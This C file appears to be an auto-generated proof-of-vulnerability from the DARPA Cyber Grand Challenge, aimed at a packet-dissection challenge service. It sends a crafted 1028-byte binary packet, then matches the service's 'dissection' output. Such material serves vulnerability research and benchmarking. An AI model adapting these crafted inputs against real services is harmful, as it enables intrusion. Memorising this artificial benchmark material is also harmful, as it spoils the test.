#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\xf6\x20\x19\x8f"
         "\x45\xe7\x50\x47\x92\x0e\x52\x21\xd3\xc4\xbd\xd9\xac\x70\xc2\x31"
         "\x0a\x01\x00\x00\xf1\xad\x9d\x89\x9e\xa1\xcc\xac\x5e\x24\x3b\x65"
         "\x08\xf4\xa9\x97\xfe\x99\xb1\xa1\x36\xb5\xf5\xd7\xa5\xd0\x51\x90"
         "\x88\x08\xee\xc7\xc5\x7a\xca\x5a\x98\x99\xa6\x05\xbf\x51\x61\xd9"
         "\xc1\x2e\xa4\xb8\x39\x48\x80\x6b\xdc\x71\x1a\xec\x41\x43\x64\x37"
         "\x7c\x01\x8c\x26\x3d\xfe\x5d\x83\x88\x1d\x4c\x48\x4a\x43\x77\xb2"
         "\x0a\x96\x95\xf1\x2c\x4a\x97\x08\xd8\x48\xa2\xaf\xa7\xbd\xfb\x0f"
         "\x61\xc6\x76\xde\x4b\x49\xa7\xa0\x15\x0c\xdf\x62\xb1\x71\x29\x3c"
         "\x72\xe4\x08\x15\xa8\xb6\xb3\x03\x01\xf7\xca\xf2\xf8\xcf\x2a\x0b"
         "\xbc\xbf\xba\x2d\xaa\x2b\xfd\x65\x8d\x45\x55\xf3\xec\x78\x42\x93"
         "\x12\x03\xb7\x84\x9d\x8d\x06\xf7\xcc\x33\xad\x27\x3d\xe0\xbe\x30"
         "\x5e\x18\x0a\xba\xcc\x0e\x8a\x00\x96\xf2\xd1\x48\xa8\x02\x4f\x13"
         "\x99\xc3\x5d\x04\xe2\x0d\x89\x77\x95\xa9\xf5\x53\x32\xe4\x4b\xd8"
         "\xf2\x8f\x16\x05\x85\x60\xab\x39\x09\xd3\x4d\xfd\x6d\xc1\x3b\x72"
         "\x0e\xec\x7d\xda\x27\xad\xe4\x0b\x27\x73\xbb\x2e\x56\x4c\x9e\x8f"
         "\xd4\x97\x53\xcb\x5f\x30\x4b\x7c\xf3\x51\x9c\xae\x63\xd4\x45\x22"
         "\x34\xd7\x41\xd5\xbb\x43\x5f\x62\x9d\xb5\xbf\xca\x72\xe0\xf9\xec"
         "\xec\x66\x70\xd1\x75\x1b\x1d\xb8\x7a\x33\x7a\x6d\x80\xe7\x6b\x29"
         "\xac\xf5\x2b\x82\xd0\x37\x2b\x2a\x8e\x0a\x5a\xb7\xf5\x52\x94\x1e"
         "\x73\x0b\xfa\x8a\xd4\x46\x39\x29\xf3\x08\x5a\x53\x21\xbd\xe6\x0a"
         "\x06\x32\xbc\x5b\xb8\xba\x7e\x78\x1a\xc8\x1a\xa3\xc8\x60\xd7\x6a"
         "\x73\xd0\xac\x35\xe6\xb0\xf3\xdf\xa0\x5b\x12\x6b\x20\x7b\x44\xcc"
         "\x89\x46\x28\x3d\x3d\x09\x08\x00\xc7\x20\x26\x35\xa8\x32\x69\x1c"
         "\xda\x30\xe1\x44\xe8\x6b\x52\xcd\x7e\xfb\xc6\x81\x95\xad\xf9\xd0"
         "\x8c\x12\x6e\x4e\xd3\x8a\x85\x25\xd0\x01\x17\x90\x13\x84\x1f\xce"
         "\x8a\x2a\x39\xee\xf9\xcf\x47\xb4\x76\xf8\xae\xe6\x69\xd9\xfe\x2d"
         "\x45\x03\xbf\x60\x16\x35\xb8\x28\xc1\xf9\xfb\x58\xce\x4f\x77\x3e"
         "\x6d\xfa\xf6\x7a\xe8\xed\x81\xc5\x31\x47\x63\x0b\xa1\x96\xf3\x04"
         "\x0a\xa7\xee\xe7\xc3\x3e\x24\xd7\x34\x5d\x0c\x9e\xea\xf2\x0c\x9d"
         "\x82\x95\x21\x61\x0d\x87\xff\x3b\xa6\x53\x5e\x7f\xf5\x6d\x69\x3c"
         "\x55\xbd\x06\xc5\xe3\x61\x05\x92\x66\xf3\x6e\x39\x99\x87\xb3\x0c"
         "\xb1\xe0\xe0\xe1\xc0\x94\x75\x84\x6c\x51\x4f\x89\xfa\x3d\xdf\x38"
         "\xaa\xd1\xbc\xa0\x44\x3d\x76\x4d\x05\x6d\x9f\x17\x37\xcb\xc6\x1f"
         "\x69\xa3\xcc\xa8\xc6\x0d\x7e\xc7\x74\x40\xcd\x1c\x13\xce\xcf\x6a"
         "\x47\x47\x58\xa5\x2a\x56\x8f\x95\x19\x2a\xfe\xe3\xb6\x36\x8f\x68"
         "\x5a\x07\xa1\xc4\x24\x7b\x7d\xd1\xb3\xaa\x9a\xd6\x94\xee\x12\xad"
         "\xc4\x2f\x81\x11\xfb\x86\xc4\xda\xe7\x4a\x9e\x94\x7a\x25\x4c\xd3"
         "\x4d\x13\xfa\xcf\xed\xc5\x2d\x1e\xf9\xa7\x3a\x34\xab\xc5\x87\x1f"
         "\x73\x4d\x11\x7d\x69\x78\xa9\xec\xc9\xbc\x8e\xf8\xb1\x8f\xb0\xe6"
         "\xbc\x47\x84\x76\x24\x8c\x0e\xd8\x0c\x0a\xe8\xad\x98\xf4\xf7\x7c"
         "\x37\x94\x18\xdd\x68\x14\x6e\xae\x4e\x0a\x0f\xaf\x71\x1c\xe8\x77"
         "\x2b\x45\x26\x77\x68\x86\x75\x97\x43\x9c\x1c\x70\x54\x73\xa7\x97"
         "\x82\x6e\x60\x4a\x10\x6c\x77\x34\xa4\xc3\xcd\xbb\x01\x77\x72\x07"
         "\xb1\x6b\xcb\xd0\x26\x51\x49\x6c\xd7\x2c\x57\x6f\x33\xe0\xd1\x70"
         "\x80\x64\x6c\x67\xd2\xeb\x74\x0a\x31\x93\xc4\xde\x14\x37\x3e\x2a"
         "\xa8\xef\x21\x9c\x4f\x4e\xbd\xde\x7f\x4d\x58\xbf\x4b\x74\xa0\xdc"
         "\x01\xff\x2c\x55\x2c\x30\xec\x87\xf9\x68\xc2\x00\x9b\x20\x54\x46"
         "\x29\x75\xfc\x29\xde\xff\x5f\xb0\xde\x4a\x79\x51\x36\xca\x0f\xe0"
         "\x8f\xfa\xfd\x7d\x08\x00\xc6\x77\xd3\x3e\xc7\x70\x47\x43\xe9\xc0"
         "\x87\x79\x92\xa0\x68\x7e\xa0\xff\xab\x27\x0a\xfa\x7a\x72\xf1\xce"
         "\x24\xab\xd9\x95\xe3\x0c\x50\x3c\x73\x74\x5f\x7d\x13\x95\x22\x17"
         "\xcf\xe7\xeb\x32\xdb\x77\x0e\xb4\xbb\x6e\x0a\xf7\x32\x5a\xe2\x08"
         "\x71\x37\x7c\x6b\x7e\xa2\xb3\xa0\x33\x0b\xf1\x7b\x01\x25\xfb\x0c"
         "\x1d\xb4\x57\xdc\xdb\x18\x71\xc5\x76\x3d\x99\x86\x13\x4f\x35\x6c"
         "\x0e\x2e\xdc\xf8\xa9\x91\x02\xab\x69\xbd\xdd\x04\x33\xd7\xd2\x21"
         "\xfc\x2a\x7d\xaa\x32\x31\xc5\xff\x02\x3f\xf0\xca\x29\x6e\x72\xd6"
         "\x9e\x48\x3a\x4b\xe4\xd9\xe3\x02\xd3\x6f\x73\xbc\xed\xe5\x65\x4f"
         "\x01\xe4\xc4\xf6\xdb\xce\xb1\x95\x7d\xdb\x4f\x8a\x61\xe1\xd2\x20"
         "\xf0\x61\x8f\xfe\xd7\x24\x50\x86\x66\x48\xdd\x0f\xb2\x41\xd2\x69"
         "\x65\x02\xf9\xbe\xc2\xa2\x5e\xcf\x62\xfe\x32\x9f\x2a\xc2\x9e\xa3"
         "\xa5\xf9\xee\xac\x27\x82\x38\xfb\xc6\xc3\xba\xa0\x3d\xdd\xaa\xa3"
         "\xe9\xfc\x54\x36\x5f\x8b\xed\xdc\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===rofl
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x72\x6f\x66\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===peerlesslyforetalk
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x70\x65\x65\x72\x6c\x65\x73\x73\x6c\x79\x66"
         "\x6f\x72\x65\x74\x61\x6c\x6b";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
